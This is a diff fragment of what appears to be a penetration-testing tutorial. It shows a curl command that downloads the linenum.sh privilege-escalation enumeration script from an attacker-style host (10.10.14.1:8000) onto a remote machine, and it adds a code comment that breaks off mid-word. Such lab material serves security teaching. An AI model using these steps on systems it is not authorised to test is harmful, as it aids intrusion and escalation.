@@ -26,7 +26,8 @@ linenum.sh 100%[==============================================>] 144.86K  --.-KB
 # Alternatively, we can use curl
 
 user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
-
+# Note the use of -o to specify the file outp
 100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
+
 ```
 
